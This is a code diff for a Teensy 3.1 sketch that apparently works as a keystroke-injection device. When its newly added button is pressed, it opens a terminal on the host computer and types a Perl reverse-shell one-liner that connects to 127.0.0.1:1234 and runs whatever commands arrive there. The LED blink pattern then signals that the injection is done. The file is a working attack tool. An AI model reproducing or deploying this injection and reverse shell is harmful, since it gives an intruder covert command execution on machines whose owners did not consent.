@@ -1,18 +1,26 @@
 // teensy 3.1
 
-int led = 13;
+int PIN_LED = 13;
+int PIN_BUTTON = 7;
+
+// loop effects
+int start = 0;
+int BLINK_DELAY = 250;
 
 void setup() {
+  pinMode(PIN_LED, OUTPUT);
+  pinMode(PIN_BUTTON, INPUT);
+  digitalWrite(PIN_LED, HIGH);
+}
+
+void actions() {
   delay(1000);
-
-  pinMode(led, OUTPUT);
-  digitalWrite(led, HIGH);
-
-  delay(1000);
-
   openTerminal();
   delay(50);
   type("perl -MIO::Socket -e'$c=new IO::Socket::INET(\"127.0.0.1:1234\");print $c `$_`while<$c>'");
+
+  start = 3;
+  BLINK_DELAY = 75;
 }
 
 // universal
@@ -82,10 +90,23 @@ void windowsRun(String cmd) {
 
 // loop
 
+
 void loop() {
   // flash when done
-  digitalWrite(led, HIGH);
-  delay(200);
-  digitalWrite(led, LOW);
-  delay(200);
+
+  digitalWrite(PIN_LED, HIGH);
+  delay(BLINK_DELAY);
+  if (start != 0) {
+    digitalWrite(PIN_LED, LOW);
+    delay(BLINK_DELAY);
+  }
+  if (start == 3) {
+    return;
+  }
+
+  // PIN_BUTTON press
+  if (digitalRead(PIN_BUTTON) == HIGH && start == 0) {
+    start = 1;
+    actions();
+  }
 }
